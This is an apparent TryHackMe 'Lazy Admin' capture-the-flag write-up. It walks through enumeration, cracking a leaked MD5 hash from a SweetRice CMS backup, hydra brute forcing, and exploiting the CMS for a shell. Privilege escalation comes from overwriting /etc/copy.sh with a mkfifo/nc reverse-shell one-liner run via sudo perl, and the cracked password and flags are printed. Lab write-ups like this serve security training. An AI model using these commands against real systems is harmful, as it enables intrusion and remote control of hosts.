LAZY ADMIN


ENUMERATION NMAP

"""

┌──(root㉿kali)-[/home/…/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─# nmap -sS -sV -A 10.10.86.86 -oN namp.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 06:06 EST
Nmap scan report for 10.10.86.86
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/24%OT=22%CT=1%CU=36865%PV=Y%DS=2%DC=T%G=Y%TM=621766E
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   166.64 ms 10.11.0.1
2   166.95 ms 10.10.86.86

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.32 seconds
                                                             

"""


PORT 22 ssh 
PORT 80 : default apache page 



LETS RUN GOBUSTER ON WEB 

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.86.86/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.86.86/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/24 06:10:49 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/content              (Status: 301) [Size: 312] [--> http://10.10.86.86/content/]
/index.html           (Status: 200) [Size: 11321]                                
/server-status        (Status: 403) [Size: 276]                                  
                                                                                 
===============================================================
2022/02/24 06:12:14 Finished
===============================================================


"""

FOUND A SWEETRICE CMS ON /content

LETS RUN GOBUSTER ON THAT DIRECTORY


"""

──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.86.86/content/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.86.86/content/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/24 06:14:38 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/_themes              (Status: 301) [Size: 320] [--> http://10.10.86.86/content/_themes/]
/as                   (Status: 301) [Size: 315] [--> http://10.10.86.86/content/as/]     
/attachment           (Status: 301) [Size: 323] [--> http://10.10.86.86/content/attachment/]
/images               (Status: 301) [Size: 319] [--> http://10.10.86.86/content/images/]    
/inc                  (Status: 301) [Size: 316] [--> http://10.10.86.86/content/inc/]       
/index.php            (Status: 200) [Size: 2197]                                            
/js                   (Status: 301) [Size: 315] [--> http://10.10.86.86/content/js/]        
                                                                                            
===============================================================
2022/02/24 06:16:00 Finished
===============================================================


"""


FOUND LOGIN PAGE ON /as Directory 

LETS TRY default passswords

FOUND VERSION INFO FroM 10.10.86.86/content/inc/lastest.txt
SWEET RICE VERSION 1.5.1


SEARCHSPLOITS
"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─$ searchsploit sweetrice 1.5.1
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                       |  Path
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 1.5.1 - Arbitrary File Download                                                                                            | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                                                              | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                                                                  | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                                                         | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                                                                    | php/webapps/40700.html
------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


"""

but first lets brute force it 

HYDRA COUDNT CRACK IT 

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.86.86 http-post-form "/content/as/?type=signin&timeStamp=1645701790901:user=^USER^&passwd=^PASS^:Login failed"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-24 06:27:24
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.86.86:80/content/as/?type=signin&timeStamp=1645701790901:user=^USER^&passwd=^PASS^:Login failed
[STATUS] 1025.00 tries/min, 1025 tries in 00:01h, 14343374 to do in 233:14h, 16 active
[STATUS] 1061.00 tries/min, 3183 tries in 00:03h, 14341216 to do in 225:17h, 16 active
^C^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.

"""


LETS RUN SOME EXPLOITS 

EXPLOIT 1: SweetRice 1.5.1 - Backup Disclosure 

LETS ACCES SOME BACKUPS TO GET PASSWORDS


http://10.10.86.86/inc/mysql_backup

FOUND 
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";

PASSWORD HASH




john --format=md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2022-02-24 07:14) 6.666g/s 225280p/s 225280c/s 225280C/s coco21..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

"""


USERNAME=manager
Password=Password123

LETS LOG IN 


LOGED IN



EXPLOIT 2 SweetRice 1.5.1 - Arbitrary File Upload    -----> FAILED

EXPLOIT 3 SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution    ----> success                             


"""
┌──(root㉿kali)-[/home/…/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Lazy_Admin]
└─# nc -lnvp 7777                           
listening on [any] 7777 ...
connect to [10.11.61.80] from (UNKNOWN) [10.10.86.86] 36280
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 14:50:06 up  1:45,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 


"""


FLAG 1:

$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}


PRIVELLEGE ESCALATION


$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
$ cat /etc/copy.sh  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f


cant edit the etc/copy.sh file lets overwrite it with the modified version 

COMMAND -->

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.61.80 5554 >/tmp/f' >/etc/copy.sh


sudo /usr/bin/perl /home/itguy/backup.pl

"""

root.txt
# cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}


"""





